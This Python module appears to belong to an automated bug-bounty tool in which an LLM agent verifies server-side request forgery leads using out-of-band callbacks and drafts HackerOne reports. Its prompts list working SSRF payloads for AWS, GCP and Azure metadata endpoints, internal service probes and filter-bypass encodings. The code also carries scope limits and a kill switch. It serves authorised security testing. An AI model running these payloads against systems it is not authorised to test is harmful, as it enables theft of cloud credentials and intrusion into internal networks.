"""
Resource Specialist Sniper — Deep SSRF verification with OAST integration.

Receives SSRF leads from the Scout and performs out-of-band verification
using interactsh callbacks. Uses Opus-tier reasoning for cloud metadata
chaining and HackerOne report generation.

The key differentiator from the Scout's SSRF test:
  - Scout uses httpbin.org (visible, non-blind SSRF only)
  - Sniper uses OAST callbacks (detects BLIND SSRF where response isn't reflected)
  - Sniper chains to cloud metadata, internal services
"""
import json
import logging
import re
import time

from scout_agent import ScoutHttpTool, KillSwitch, _parse_scout_response

log = logging.getLogger("hunter")

MAX_ITERATIONS = 7
TIMEOUT = 10


# =====================================================================
# RESOURCE SPECIALIST SYSTEM PROMPT
# =====================================================================

RESOURCE_SNIPER_PROMPT = """You are a SENIOR security researcher performing DEEP SSRF VERIFICATION.
A Scout agent identified a potential Server-Side Request Forgery. Your job is to CONFIRM it using out-of-band (OAST) callbacks and escalate to demonstrate real impact.

You have TWO tools:
1. HTTP tool: Make GET/POST/PUT/PATCH requests (DELETE is forbidden)
2. OAST tool: Generate callback URLs and check if the server contacted them
   - generate_oast_url(label) → returns a unique callback URL
   - check_oast_callbacks() → returns list of received callbacks (DNS, HTTP, SMTP)

THE LEAD FROM SCOUT:
{lead_summary}

YOUR MISSION — SSRF DEEP VERIFICATION:
{verification_guidance}

For each step, reply ONLY JSON:
{{
  "thought": "detailed reasoning",
  "action": {{
    "type": "http",
    "method": "GET/POST/PUT/PATCH",
    "url": "full URL",
    "headers": {{}},
    "body": {{}}
  }},
  "done": false
}}

OR for OAST operations:
{{
  "thought": "why I need an OAST callback",
  "action": {{
    "type": "oast_generate",
    "label": "ssrf-test-1"
  }},
  "done": false
}}

{{
  "thought": "checking if server contacted my OAST URL",
  "action": {{
    "type": "oast_check"
  }},
  "done": false
}}

When done:
{{
  "thought": "final analysis with full evidence chain",
  "action": null,
  "done": true,
  "verdict": "confirmed" or "rejected" or "needs_manual_check",
  "confidence": 1-10,
  "severity": "Critical/High/Medium/Low",
  "evidence_summary": "complete SSRF evidence including OAST callback proof",
  "report": "Full HackerOne-ready Markdown report (if confirmed). Include: Summary, Severity, Steps to Reproduce (exact HTTP requests + OAST proof), Impact, Remediation."
}}"""


def _get_ssrf_verification_guidance(lead_data, has_oast):
    """Deep SSRF verification instructions."""
    evidence = lead_data.get("initial_evidence", "")
    endpoint = lead_data.get("endpoint", "/")
    subdomain = lead_data.get("subdomain", "")

    oast_section = ""
    if has_oast:
        oast_section = """
OAST (Out-of-Band) VERIFICATION:
  1. Generate an OAST URL using: {"type": "oast_generate", "label": "ssrf-blind"}
  2. Inject this URL into the SSRF parameter
  3. Wait and check: {"type": "oast_check"}
  4. If callbacks received → BLIND SSRF CONFIRMED (even if response doesn't reflect content)
  This is the GOLD STANDARD for SSRF proof."""
    else:
        oast_section = """
NOTE: OAST is not available. Use httpbin.org as your callback canary.
If you can get the server to fetch https://httpbin.org/get and see the response, that proves SSRF."""

    return f"""SSRF DEEP VERIFICATION:

Scout's finding: {evidence}

Your verification steps:
1. REPRODUCE: Repeat Scout's SSRF test to confirm the basic behavior
2. OAST VERIFICATION (if available): Generate a callback URL and inject it — this proves blind SSRF
{oast_section}
3. CLOUD METADATA ESCALATION: Try these payloads through the SSRF vector:
   - AWS: http://169.254.169.254/latest/meta-data/
   - AWS IMDSv2: First GET with header "X-aws-ec2-metadata-token-ttl-seconds: 21600", then use token
   - GCP: http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)
   - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (header: Metadata: true)
4. INTERNAL SERVICE PROBING: Try reaching internal services:
   - http://localhost:8080/, http://127.0.0.1:6379/, http://internal-api:3000/
   - Check if response differs from normal external requests
5. BYPASS ATTEMPTS (if initial payloads are blocked):
   - URL encoding: http://%31%32%37.%30.%30.%31/
   - Decimal IP: http://2130706433/ (127.0.0.1 as integer)
   - IPv6: http://[::1]/
   - DNS rebinding: Use a domain that resolves to 127.0.0.1
   - Redirect chain: Point to an external URL that 302-redirects to internal

SEVERITY GUIDE:
- Critical: Can access cloud metadata (AWS keys, GCP tokens) or internal databases
- High: Can reach internal services and read sensitive responses
- Medium: Blind SSRF confirmed (OAST callback) but no internal access demonstrated
- Low: Can only fetch external URLs (limited impact)"""


# =====================================================================
# SNIPER EXECUTION
# =====================================================================

def run_resource_sniper(lead_data, scope_domains, oast_client=None):
    """Run the Resource Specialist Sniper on an SSRF lead.

    Uses Opus (tier3) for deep reasoning. Integrates OAST for blind SSRF detection.

    Args:
        lead_data: dict from Scout with initial_evidence, endpoint, etc.
        scope_domains: set of allowed domains
        oast_client: OASTClient instance (or None if OAST unavailable)

    Returns:
        dict with verdict, confidence, severity, evidence_summary, report
        or None if AI unavailable
    """
    from llm_client import call_tier

    subdomain = lead_data.get("subdomain", "")
    endpoint = lead_data.get("endpoint", "/")
    base_url = f"https://{subdomain}{endpoint}"

    tool = ScoutHttpTool(scope_domains)
    has_oast = oast_client is not None and oast_client.is_available
    guidance = _get_ssrf_verification_guidance(lead_data, has_oast)

    # Track generated OAST URLs for this session
    oast_urls = []

    lead_summary = (
        f"Vulnerability: SSRF\n"
        f"Target: {subdomain}{endpoint}\n"
        f"Scout confidence: {lead_data.get('confidence', 0)}/10\n"
        f"Initial evidence: {lead_data.get('initial_evidence', 'N/A')}\n"
        f"Payload used: {lead_data.get('payload_used', 'N/A')}\n"
        f"OAST available: {'YES' if has_oast else 'NO'}"
    )

    prompt = RESOURCE_SNIPER_PROMPT.format(
        lead_summary=lead_summary,
        verification_guidance=guidance,
    )

    conversation = f"""{prompt}

=== TARGET ===
Host: {subdomain}
Endpoint: {lead_data.get('method', 'GET')} {endpoint}
Base URL: {base_url}
OAST: {'Available — use oast_generate and oast_check actions' if has_oast else 'Not available — use httpbin.org as canary'}

Begin deep SSRF verification. Reproduce the Scout's finding first."""

    for iteration in range(MAX_ITERATIONS):
        response = call_tier("tier3", conversation, max_tokens=2000)
        if not response:
            response = call_tier("tier2", conversation, max_tokens=1500)
        if not response:
            log.warning(f"  [SNIPER-RES] AI unavailable at step {iteration}")
            return None

        data = _parse_scout_response(response)
        if not data:
            log.warning(f"  [SNIPER-RES] Parse failed at step {iteration}")
            break

        thought = data.get("thought", "")
        action = data.get("action")
        done = data.get("done", False)

        log.info(f"  [SNIPER-RES] {subdomain}{endpoint} step={iteration+1} — {thought[:100]}...")

        if tool.kill_switch.triggered:
            done = True

        if done or not action:
            result = {
                "verdict": data.get("verdict", "rejected"),
                "confidence": data.get("confidence", 0),
                "severity": data.get("severity", "Low"),
                "evidence_summary": data.get("evidence_summary", ""),
                "report": data.get("report", ""),
                "iterations": iteration + 1,
                "total_requests": tool.total_requests,
                "vuln_class": "ssrf",
                "oast_callbacks": len(oast_urls),
            }
            return result

        # Dispatch action based on type
        action_type = action.get("type", "http")
        observation = ""

        if action_type == "oast_generate":
            # Generate OAST callback URL
            if has_oast:
                label = action.get("label", f"ssrf-{iteration}")
                oast_url = oast_client.generate_url(label)
                oast_urls.append(oast_url)
                observation = f"OAST URL generated: {oast_url}\nUse this URL in your SSRF payload. Then use oast_check to see if the server contacted it."
                log.info(f"  [SNIPER-RES] Generated OAST URL: {oast_url}")
            else:
                observation = "ERROR: OAST not available. Use httpbin.org/get as your canary instead."

        elif action_type == "oast_check":
            # Poll for OAST callbacks
            if has_oast:
                callbacks = oast_client.poll_interactions(timeout_sec=15, poll_interval=3)
                if callbacks:
                    cb_summary = "\n".join(
                        f"  - [{cb['protocol']}] from {cb['remote_address']} at {cb['timestamp']}"
                        for cb in callbacks[:10]
                    )
                    observation = f"OAST CALLBACKS RECEIVED ({len(callbacks)}):\n{cb_summary}\n\nThis CONFIRMS the server made an outbound request to your OAST URL = BLIND SSRF CONFIRMED!"
                    log.info(f"  *** [SNIPER-RES] OAST callbacks received: {len(callbacks)}")
                else:
                    observation = "No OAST callbacks received within 15 seconds. The server did NOT contact your OAST URL. Try a different injection point or payload format."
            else:
                observation = "ERROR: OAST not available."

        elif action_type == "http":
            # Standard HTTP request
            act_method = action.get("method", "GET")
            act_url = action.get("url", base_url)
            act_headers = action.get("headers")
            act_body = action.get("body")

            # SAFETY: Allow SSRF payloads targeting internal IPs THROUGH the vulnerable endpoint
            # but NOT direct requests to internal IPs from our machine
            http_result = tool.execute(act_method, act_url, headers=act_headers, body=act_body)

            if http_result.get("error"):
                observation = f"ERROR: {http_result['error']}"
                if http_result.get("kill_switch"):
                    observation += "\n** KILL SWITCH — set done=true immediately. **"
            else:
                observation = (
                    f"HTTP {http_result['status_code']} | "
                    f"Content-Length: {http_result.get('body_length', 0)} | "
                    f"Redirect: {http_result.get('redirect', 'none')}\n"
                    f"Headers: {json.dumps(dict(list(http_result.get('headers', {}).items())[:10]))}\n"
                    f"Body: {http_result.get('body_snippet', '')[:1200]}"
                )
        else:
            observation = f"Unknown action type: {action_type}. Use 'http', 'oast_generate', or 'oast_check'."

        conversation += (
            f"\n\n=== STEP {iteration + 1} ===\n"
            f"Your response:\n{response}\n\n"
            f"OBSERVATION:\n{observation}\n\n"
            f"Continue verification or set done=true with your final verdict and report."
        )

    return {
        "verdict": "needs_manual_check",
        "confidence": 3,
        "severity": "Low",
        "evidence_summary": "Max iterations without conclusive verdict",
        "report": "",
        "iterations": MAX_ITERATIONS,
        "total_requests": tool.total_requests,
        "vuln_class": "ssrf",
        "oast_callbacks": len(oast_urls),
    }
